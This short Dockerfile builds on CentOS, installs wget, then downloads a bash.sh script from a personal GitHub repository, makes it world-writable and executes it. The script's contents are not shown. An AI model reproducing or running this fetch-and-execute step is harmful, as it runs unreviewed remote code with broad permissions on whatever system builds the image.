FROM centos:latest

RUN yum install wget -y
RUN wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/bash.sh
RUN chmod 777 bash.sh
RUN bash bash.sh
